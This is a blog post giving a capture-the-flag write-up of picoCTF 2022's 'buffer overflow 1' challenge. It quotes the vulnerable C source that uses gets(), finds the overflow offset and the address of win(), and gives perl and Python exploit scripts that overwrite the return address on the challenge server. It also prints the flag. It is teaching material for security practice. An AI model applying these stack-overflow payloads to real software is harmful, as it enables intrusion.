---
layout: post
title: picoCTF 2022 - buffer overflow 1
date: "2023-05-01 01:49:42 +0100"
categories: [CTF-WRITEUPS, picoCTF - Binary exploitation]
tags: [c, pwn, binary exploitation, rev, gdb]
---

Hello friend,

In this post, we are going to solve a picoCTF [challenge](https://play.picoctf.org/practice/challenge/258?category=6&page=2)!

## Description

Control the return address

Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).
You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using nc saturn.picoctf.net <span style="color : red">[PORT]</span>

## Solution

<span style="color : red">vuln.c</span>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

The first thing that catches attention is `gets()`.

According to the official documentation :

_**Never use this function.**_

_`gets()` reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF,
which it replaces with a null byte ('\0'). No check for buffer overrun is performed (see BUGS below)._

Basically, we declared a buffer that holds 32 bytes.

If we somehow read enough bytes to overwrite the return address, we can jump to our win function.

The return address is the address that the program will jump to once it finishes with the current stack frame.It will basically pop the return address and sets that address in the intruction pointer.

The instrution pointer will then jump to that address, and whatever is stored there will be executed by the CPU.

<img src="/../assets/picoCTF_bufferoverflow1.png" />

Now we need to determine two things :

- the offset : how many bytes we need so we can reach the return address
- the address of the win function

### Determining the offset

There are plenty of ways to achieve that, but let's try something easy.

We already know that we need more than 32 bytes to smash the stack, let's feed the program 50 bytes.

I'm going to use `cyclic`, which generates a sequence of characters respecting a pattern, this way we can easily determine the offset.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ cyclic 50 | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                cyclic 50 |
zsh: segmentation fault  ./vuln
```

We successfully smashed the stack, the return address is now `0x6161616c` which is the equivalent of `laaa`

You can calculate how many characters until we reach `laaa`, or you can use `cyclic -l` with the hexadecimal value of those characters.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ cyclic -l laaa
44
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ cyclic -l 0x6161616c
44
```

> Offset = 44

### The win function

```bash
└─$ checksec --file vuln
[*] '/home/yariss/boxes/picoCTF/buffer_overflow1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We can use gdb and print the address of `win`, since the binary doesn't have PIE enabled.

> Note : Since PIE is disabled, each time we run the binary, its going to load in the same memory region, meaning the addresses would be the same each time.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ gdb ./vuln
gef➤  p win
$1 = {<text variable, no debug info>} 0x80491f6 <win>
```

We got it : `0x80491f6`

## Crafting our script

Knowing the offset and the return address, we just need to feed the input to our program.

<img src="/../assets/picoCTF_bufferoverflow1_smashed.png" />

Here is a one liner script i wrote with `perl`

```bash
perl -e 'print "A" x 44 . "\xf6\x91\x04\x08" . "\n"  '
```

> Note : Notice the return address is in reverse, due to the endienness (the program is in little endian byte order)

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ readelf -all vuln | grep endian
  Data:                              2's complement, little endian

```

Now all we need to do is to pipe it with the program stored in the picoCTF server

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ perl -e 'print "A" x 44 . "\xf6\x91\x04\x08" . "\n"  '| nc saturn.picoctf.net 54239
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}
```

We got it!

Before we finish, here is a second script I wrote using python sockets, which achieves the same results.

```python
#!/bin/python3
import socket

RET = b"\xf6\x91\x04\x08"
OFFSET = b"A" * 44
payload = OFFSET + RET + b"\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = 'saturn.picoctf.net'
PORT = 54239

s.connect((HOST,PORT))
data = s.recv(1024)
s.sendall(payload)
while data:
    data = s.recv(1024)
    print(data.decode())

```

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow1]
└─$ python solver.py
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6

picoCTF{addr3ss3s_ar3_3asy_9cf083f8}
```

That is it, I hope you learned something !
